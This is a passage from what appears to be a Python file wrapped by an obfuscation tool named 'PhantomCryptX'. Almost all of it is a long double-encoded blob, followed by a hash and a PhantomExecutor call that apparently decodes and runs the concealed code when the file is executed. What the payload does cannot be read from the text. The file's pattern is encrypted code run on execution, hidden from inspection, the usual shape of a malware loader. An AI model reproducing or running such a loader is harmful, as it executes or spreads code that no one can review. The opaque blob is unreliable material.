NcUpsdDcwMExxY3U0ZWhpTUFMYy95dy9CSWMzY0Q5eEtuWmpVMmU0Y0k4RG5TUUJGbG1sOW9oa096OEFqaGNGdkhzVkZtTlhjNWpJVDhXRmhURDNBeVZCbFIxd01VcFFENVhJTXdvN3pKNWtZamdlTTV1QXNaZ1ZYNmQvN0xtUitRSGhKR0duM0hLUU80NnJrRW9OUUpvRzNsU0FvZEZVam1FSzY4U0FGZXFVYk5iMk5VbFFPaXRsN1lkOE9mTXVHdUZzN1lzd3NHZms5Z0NUTEhZYWUyOWlWajAxT2tpdCtqb0NKNmFrVmgySldWcHROTi83TGN2aFh6cGNNOWpJTUJHdFlJQXd5eURLUllCdTJEVGx0RFg1SE1vNEVXN2RKZjdsa0U1VFR1TEZGejlEL0tHUnJEalFYQWI5aU80WU9pWldkb2UwQmNiSTkzdzJJNFE0WnB2OC9tNTA3bW95ZEx4TjF0c2hESzUraEF2OXovUXhBdWx6Y0pGVHI1ZU9SMXV0M1BQQmZwTTdkNWlIR3pCNjdNbkR6di9ac0x5VTh3cGRiVXFNQjJvclFMZGNYL2JwWnBmYW9HUHpDVy95WTUweWJrd1V6Y3F1eFJnYTRHcmY2V0pYZ09WUnlVWUxMbFM0aUE5YjhXdUh2M0ZGQko3T1dqUXVsUUdhWFFzUFErTVczY1NVSDBxdXVyd1JYNWxTWGlyUFJtUWRWT2ZjUlExaEI5OW5Vd0dER09TS3FUSUY4cklsRW5zQk5oT1dvT3pYd1N2NFMyb3QxR1Q4Mk1EKzlhTkI0YWYxMzJLWWgwUFA3eWpia2pESzJheE1PcGxDOVpRdnZTZm9yMUdUZ29XWDhBU0V2WGV5b3pvV29hMTVJbUFzeDJWSWZNbm5xdkFldk82Sk9vT2RvaWRtbGZndHYwYWxzZFFSMXpZRjRmTzJ1Zy92Z1JGTzhNV1orY0VSTUMzckEzbmlNdEVteWgrOFhjS2hiSlg4VFNhcVR2cm5rQ25VeFF6VlJaV2dTcVpRTG1KMkZBR0JnWHgzVm9YUG9SYUtNcjBQbm1BeDdHbkhQTDFhU3E0cTZnOUFwVWpVSGhzN25RZGZYTldINU5kd21aRTZBdWsrMHFvRHVkTVoxOTV1bU9sNENMcEw4YldsSk45SDJzQm1nMFgrVFQ2cnNzY21tV0FtdkkzczdZT2dlYkJNd1dOaVVieTlZbVlFaUZQakRIcEk3S0VRVG1YK2tmY2M5WUVSd2ZBakZ6b0YrK2tkS1RDa3NtV2swT3JhK2tKVmtrWmthYmRoTWdHajNpaVJwVFpRSlMrWTFLWitvRGJFbENINTRpWGdoTTBxOUJEZzgxNzlWQlovcEphQjZHaElLQ3plTkpURTFlMHZIdWc1TkxZS1M1RHpnQ09uNUdacVNsNzNjRzFUV3BoR0svb1JxaFpDenBPUkpMZ0o5SGd4dXBSTHU0Q0FqTHVNSXN2UStqK2N5SkFXUzhqMVFwNVRrMDM3UEZjaUpOTml5Y0NEdlNRdXZuNGRsTXc4Q2crM1grZjhKdDhxOGdyOTJKMnR1V1F6YjBoM3hEYjFHNGU5VHVBdnVNRVp3QUtna1NnL09TVE8rbEl4cThIeThaY1NlZUdXMDdLbzVEYTg1UE85a3dkRmNmR09YdkVGOCtJeFgwczhGSHFXMzBRMGRvY3JaYWRJMkxTbDE1d1VHWjc0S3o4R2E0aVRMdEpqSnFtbktXY3BWam5ycVZuUm15R3JiQW92NjQvRC9FS0pzV3p5NGtVSG5GSmplWUdUZ3VhaURneDlHeERKRGZOWDAzcUp1R3FhQTZWNGVsUHYyMml4RjUzdjRuZmx1bEF5b3Z3bzF5bzRtVWFFc2dsVjFzeTlTbXlMR0ZCNlFyK0FMSUwwbWRETE9rM2lhdEFoSS9YQjFtNUE1L3FGMUxReDUzclI2Rk0xOWlqb2YzNnNxcUxEZzdRcnRzL0c3S0VUa3l1b3pmWlFNbTN4TzRTSHo1bmtpWkJzL1VRd1lBLzMxNDZJMW5lOU1sbmhVWGRzZXdINmhvd1RDakNKdVorNnB4THlBR1JPZUxCaHVkUGFUTGpmVWdSYWlLajFrZDk2R1FmWTlyd3Mvb04xU3Y3Qnc5ZElQRC9saDFYYWN2TXMwRWZVYjZra2Rrekp1cnl1Q3VKMUJZK1NsUHVNcmpodmsvMEt5WjVWTEpLbmRaUVFEMDlpcmQ1UDNHaVlJQ3RQUGtnM2poNHc4S2tKSUxNcmJaT3FRdVdSUnFOUk4xdk9iQUh0aGlGbXlORi9MbWt6Y2dJeVQzeE1KenVzeENxZFN6WFVNeUliTEtGSEJKdTBRcmt1MnZQekRjRWZ5bmNPVGsxejVxWklqMm9hT2hTZGRkbUsrTGlFMVdRWHUxNlNQSEVHMTZpRHpkMnRmYUpPa01nTnNDdEhxaHkvTTNWdSs4SUgxWFgxL3BvREdBUFY0TitWUFlSUFB0RGdzT2pZYk1IMzNNQ2ptaFdRMkxOZWcvdmJSajNlMTd4c2FQV1dONHZWWWdKUlRYcFBrR2hrN1RaSEhtdnNyNmcwT042bjN2am1uZEpGTm91aStRYXpvMkYzcGs4dS94Mk54U3RrZGVJcVZTNkt5YTVoUUw5djF2RHV0UkZWdFl0QTBvRWlSZlVKSHkwVzNPaFZ2ang0RW8wWEw0ZyswQlF5ZFRXZDhRVldWeisxdGlkTHc3QTlsVTZHVHoyNlhBajhmMDVPRUhYdXZuUkJCcktQRTdoRXZ6RThkR3QyWVBZaVNnbk9pVktXdGo5L0xvUCtud3ZJc1RKZHU3Y3lFT1NwdGNraDBtR2IrVXJVOE5lWUpQajdpanQ2ZmtTS2VhaXQwUUhaM1ZvUEpNQkpBcXJQUy85WW9TUktBRHROejlyY3hmY3dVaWdzbnRQNkZPdzB5UEIyR3U4SmNETldLKzR1U2FobmIyRHFzMmNodURhSkdNNFU5THEzTHp6K3RiNHlUWk4wMjlPMkRJbThhSzVnZXJNWXcwclhqNnJwMTBRVG00SSsxd1BvNUhMcldQaE96WjBNM2Jma2hWNDZiV3pvZVVLUHBxclN6cVUwNnp4cUlOSWVUc1A3R0w5bE1lREJROElKYldrNEYzVUpOR09xZGlQMS80L0w4a0R0Z3YxbUU4bUJaRzNmZXRScU40b2lHWnNLVGRLMDNYWmVDTGJwOXdpVXlhTlo0NUxBWEMyMTJDQnlwZzdRZWJ0QmpqdTF2VkJZYnpSSmtLM200dUZST1B6OXpMUzZsWms4bkM0Tk83d0M2WWI3RlRSOGdWOFVDYTQvZXVycjlqYnJWY3l1YkNncWJJNWpiaU5oZE9vNnhHNDl0eHdYbjBPUnpSUE80UHVIdWdJSkpDcDN2SzUxWGRlUlpuMlQvSWtOa21FNVZudzlVL3JjcXA3dW83YndFbEVWNStScG0rWWpUOUhpLzl0V0d3cW1zQjJ0ZDMwcUVTLytyRS8wSEJxa3RBT1NQZThGOW5qejFRMFQxYVNqd1BYOFkvNERJaGliWmZjSkxBQ293RUpPQTVPMDRpVGlrdFJDNGh3K1pzQjM4N2NaY0NteHU4OC9zNTg4c2NnZDBaK0FIWXczb0lJMmorTmZBMW5hZ1djaUJSSlhza0d1aldQMjVaNG1iT2NrSCs0eVIxZzNvSVNOTllkK3N6VzZ2R1N4Ny85UVJXY0lsSzZVUDQwdUxQVW92RDJGWmpkMm9sVlVzOXB1QWVPMC9DZ1VDZ2FnWUp0WHF1ZDZVZEVUeXRlV0RjUHRLTzVrejg4R09QQTR1cFVyQktucW9pRFpIUTkzZ3pSaWRFalh1S0swWnJEbEJHWmlONVJKWFZYTXJpOFJ3clZxRFBoT01MUWV5a09Oa0hqOFhQYk44c3dFMTA3M3NWeEo5cVlMWWFIVkluUktBOXpuWGlpbmxPQTQ4dWRRMk1vZ0hiV3hiSjdRL3FwNnF6T21pZGErL0RDczc0SlRNcXAvTHFOWENzdlZqQ3Y3U1VYZUV3V3FIbUFVWGloVnVqOEluUU9yWXBzRWZ6NThJVFFrdEk1SHRsUnNlWXNLSnY4T2ZYN2FmT2sySWFUem5pbFBHc3plTldNM1RxT2EvQmZ5V1U0ZkVCb2FFWUFlb2JReWdNYmdDcjZvd09HOWJnaXdsMGZaTXlyVXVwbWtBUjl1NnlacUpkM3FmL2xHNkJZMndIeG9kT2tnU3hJQ2hCSEpkWDdoY3dMUmoybkxYMDJYY2N5Umdvb0pXcU5iNWVzOWdqTHpOMEdzUkpzMmNTczkrVnJydnptY0IyaTJ5VzAxazNWL0FXQlE5VFpRM05oZCszaTdlQUh5VTJtZ292d2hzakZ2c1NzMjFkdVJUMEo0U2xiMVp6MlRQR2Qvc3dNRzJSb3RGT3VrVlRUbUxKTXNTelg4ZzJUM1h1K1hxOVpNQW5meHcrWFFYak5lbU0xVVVJV1ZzLzBSazRxbjBndDNHMzFBdUcvTHdGLzdFZi8zeEdkb0ZLVUdNbzdyOHdJbTB1SlhyemVrQ2dQNkxpb1Fta0tyckZVOHVWa3JKUjV6dFN3Y1JCL0pUS0V6cWd6ai9RbkFzbGNDY1NUay90M2RqQ011aFFVcVVYSFpqWmxiOE9zaTA0Y0tIalJZUzQrK29uNE1sclhxc29ubnF0aWtUU0laak9jRVl0Z1djMHZ5VTlnVzk4aXNUcmg2NmMyLzRIZzdWOTYrZytRdG5heC9DRjdKdjJOQlRpTHowYjA4V3dPS2FPZDRtV0U0NThSbklKNlE4TkZvK0ozTVE1SFlZUnBTaWw3b1VCZlN1dVRGanJha1ZGRGE4Nm5NajBYeFlWLytSTXMrNnBmK1crL05zZnRvL3czMno1VUlBb2g4dm92MHQxMktMa0F3UVUzbmVpUWR5N3VPb0xvQTF0R2VXWm5sWXhYSEVBUkVPUEp2UlA0MEtJVVYzUnVvS0VFNFY2NEQyZzJoSzJUeDQwU1F0M2F5YWd1RjRpcFdUc3luWjNPakRXTFczb2ZMUERpK2tqZ3hBa09FRzRRb094bnVmR2JDOGNVSkNHenVCaWdaYUU3V0k2VkhuK2dxcVlCNjRzVXEzdFFjN09TdFM5Vk04Z1NOZXV3MXR5SlYxeUhSTDE4Q09KTHFkSUlqdXN0QVdVVUhRQVVUUFhDeHNxc0F2STFCUzUwendMLzNwVUlaZThPVVJoVlJxV3YvSGRjN0VWTU8xbnpRWnJZOVF5NWNTUmFOV3gwWTl2ckpOaENrbk94NWxrM3dlc1A1K1N4SjBkMVM1N1FqVlBvdlZwdmFtamIvcFBxVnRyallWWHFaUGtsbWphL2VtV21wRVFaYWFYSzFQam9BaEdzVkZZZHdYdE42NE5ja0t2ZXlFTEJEdkxtT09DYkxFSFpCUmFWQjgyTnJXUVRWT3BSWDdTMmQwV0lhOGNSMEc4cDlIRmR6Rjh2NWc4Mjc5SFJlY21HdjlMZFdyWWpyTkhGMWhJZERZejBtM3J3bGtNdHRCTVBlZXN6SVNobXdGMlRtbDl1VHdsZUUrR2RFTjF6V1RGc1d4QTBuRXVTVkdFRXV3TzlvUS9YOTNEaDYzem5yQ2FwK3hzaGxDZmN1elRaK1l0bUFmVm1ZRng3OUpDeC9WVDFGRXh0ZVlYc3dydzlmWDF4SmYySWg2eXBjaDQrNmd3NjF5ckVFNWR2bDNKbXYwNnBYanRvdzM2cndMZ3VlL3NpL2xEQlN4OHhkSDF1RS9hZnFlQm01N0orYWhYTmtzSFRaelJ1bnFOUkt0QUs4MFVNVG5VaWFhL0ZwaXNsZUs3RE5oWmRXRXE1bExDaTR2YUExNkVBRWxyS2FWaXY0MkRHd0pJRW4rbTk2VDFhUU9PYTRuaFlBdEozV1V4V2NVY0Z4Y0x2ck9MQ0Jxa1lvZkRRMWg3TkhZSi9TOWRqNnBXUjVxbUhmd2NEcmF5bGlqVHJUNitMaXRuN1dRQjhPb3ZhTVlkdnIwZmU2Tks1R2V0WVFPTFlmRktPYzJwRVFNcVI3UHBzeFNiYmJWQU12RXdTQXh3UWsyTDlleHFHTUNST2VRRk5vV0VpVmorYXpxTG52UUEwL3lZNlNLYkhZOVBFcytrZ2NuM1MzcDVLN3pFOGtPVklwb2VqOUdsUUMzYy8vbTcvMkU5N3lmSlRZaWRLL3VYTGFWaTVwZ1dEMkJRNmFaZ3kvWGt0QnVwYURtR0RrREpzUEJpa1d2aWQ0RDVRaEx1OVQyMDhoRFNUenBrWDBMbXB1TFI4a1Jwb0RRU2hsQWNmVWNCRW43bnd6bVBldWRvbjFBajJkNGZmSjZNaEdJaC9vM3VsajlDZjRrUlZvbVJJUTZVL3NoOVVpOEkxL29zT2gvNGRVUUFlVzIwVi9nNzlyc1hrRkFlQ3RuY3VRa0lhRTJLS3F0YzNSU0lweFpjQTFETE5haTZXNjAyZmJHcTR2QStyWkp6TERZbzU4RmFlRVBpYWxVeExRMGx1ZWxOakdmUGxrSDUyeE5BK1pLdzYxem5DelpiK1RNMlBUZnpVbUEzZlFRUHZjcVFUUUZ2dUJGZWlpTTcxbjVrSVV1dnVkUXRWamxhODh0bnVodjhkS1NWZzBrb1BIdm0vVlFJUUpxZXJyU1YyWjVUS1cxdVJXT285bTQ4NDBOSUtmSmlWZDd3dFFFelVqT0QwV01CeUxkSk1ZNmYvUmFveWFpU21ibmd3dXJVenhXcllzT0pTR3dVd2VrWTVoeTcyRzdPT2gya3lERXBYeTBFYjlFRG5IMExCdDRoT3pLd0cwSEQwVmt5anJVenlxUkhQamdnZGJ5TDA3ZW9nbEVVYXA3STloRlB3bnBzWjVwTGZTTk9HUHJIZW91UXNRNlZMb04zVmhsSCtIdkRqajJZZ1RHanFzRVdkaXpCZ2dZa3R0ZG1NVml4WGNQejJyZktwa0VJSFd0bml0YjMzU0s3VTNYeVZzOExHTitDWCtFTXdxaEdqM2VJQW5LOHpZK1FiZDdpMTBIRjh3L0t5bml3OUpOanNnS2daQmJmUTBtTUVwUVc2ZHViVVhWRGpzRDZia3Vmd3dyM1hEUG1HNEtOVFBoU2V3elhqczQydTVBT2cyUXlxUTFFQjJwZHJ1VDlQb0pISzk3WWFVdnNqK01uNmd3aHlhcFMrWURoTi9QaVdwcUlLUEJJdU5sTUVPN2pwNkUzV1ljVER6amFnL0xTMEFMTTZPNUVteW5XTERmTFYrZE92aU5RYnhFZUc0TS81Y3lweHBZbVhxOVBCTDNxcXNnWjVGOUlSRC85VmNhWDlEaThMRitSMTYvSCtlUEtxQkh4MXZuOE9yWENXVElneGpweWcxWVZ1NS9BbWRXWnZUZk14T0xmZG4wcTdDakF2OUxOamlzNWMycTdTNjR4cG8vbmxXZVNCL0FKT0tHUi8wZlBhenpXRGpRWXpvSndjUVBWMWV6anl5RFVzeGhPZVRHa3pQZ3loVWFyeS9kcXZNVSs5aUczZWFWTnNVN0ZKWitaZXpPSy8xNDB6UGpiOHZXZUhhZkFjR3JaTm5UUmNDK3BjV3hlRHJpRjhKbWs2NStTVTRDcFRVZTVwZWV4NE5WYkhSdm5xVjhsUmN2N0VhTWxGbml5M3F5U3NxT05RRURtNllaTVRMcHJCNjloQ0JXcHVuVy9NNis3ZUM4SEJtZkQ5UE5iWTRuZjdTVGlPZ0JlcGVReWxLQzJPbTZBTkIrMURINFAySXdQdGJFMjdERzRCNG9jSG8yVStpZDVCMTVsNGRxRWRxWUNVbXpUdU1jTVVVTWh2Mldyd0sybmp2eXhQWnNuMDVEbmlKckoxb0JTNlh2Q3hTc1BHelFzRVd2RFNEQjFRTmw4RmhQdVV4TjNkb2dFUFlQME1DSHAvQWdWYytLUGVRR3NhanB1L3NFSlFZaHR1N3duUUtucmpCRWYxVjNnYy9va3RBVzVDL1J0VnZ6TzhOQXJhSDJCWlFoV0ZsOVpoUldsRkpHRHZ5WlJ4NHRwaXlLdVJTUT09'
expected_hash = "7ebf52341a6c59917648231428f9642117bfba43136c76449d6b855fb2fe179e"

print("== PhantomCryptX Protected File ==")

executor = PhantomExecutor()
executor.execute(double_encoded_data, expected_hash)
